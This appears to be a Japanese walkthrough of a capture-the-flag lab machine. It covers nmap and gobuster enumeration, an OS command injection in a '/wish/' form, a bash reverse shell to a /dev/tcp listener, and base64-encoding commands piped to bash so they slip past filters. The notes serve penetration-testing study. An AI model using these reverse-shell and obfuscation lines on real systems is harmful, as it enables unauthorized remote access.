## 論点
- ncコマンドでtcpポートに接続
- reverse-shellの暗号化
  - 問題 `ls -la`コマンドをlsと書かずに実行する
  - <details><summary>答え</summary>
    
    `echo bHMgLWxh | base64 -d | bash`
    
    </details>

## 攻略
- nmap
  - 21,22(filtered),1337,7331 
- webサイトを見る
  - 1337ポートは見れないので、7331ポートをみる。特に何もない
- 1337ポートを見る
  - tcpポートが開いているのでncコマンドで接続する
  - `nc $IP 1337`
  - 算数の計算ができるが、特に得るものはない
- 7331ポートでgobuster
  - 大きな辞書を使う
  - `/wish/`,`/genie/` 
- webサイトを見る
  - genieはエラーが出るので、/wish/をみると何かできそう
- osコマンドインジェクション
  - 入力欄に`id`をすると、リダイレクトされたURLのところに結果が返ってくる
  - `bash -c 'exec bash -i &>/dev/tcp/192.168.56.101/9001 <&1'`
  - ~には`bash -i `のリバースシェルのbase64で変換したものを入れる
  - `echo ~ | base64 -d | bash` 
